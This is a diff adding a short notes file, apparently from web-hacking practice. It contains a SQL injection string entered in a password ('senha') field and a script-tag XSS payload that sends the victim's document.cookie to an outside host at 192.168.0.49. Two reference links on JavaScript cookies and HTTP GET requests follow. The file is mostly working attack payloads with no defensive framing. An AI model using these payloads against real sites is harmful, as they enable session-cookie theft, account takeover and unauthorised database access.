@@ -1,0 +1,11 @@
+username: asas
+senha:12312' union select * from users where id='2
+
+
+<script>function httpGet(theUrl) {     var xmlHttp = new XMLHttpRequest();     xmlHttp.open( "GET", theUrl, false );   xmlHttp.send( null );     return xmlHttp.responseText; } httpGet("http://192.168.0.49/"+document.cookie);</script>
+
+
+https://www.w3schools.com/js/js_cookies.asp
+
+
+https://stackoverflow.com/questions/247483/http-get-request-in-javascript
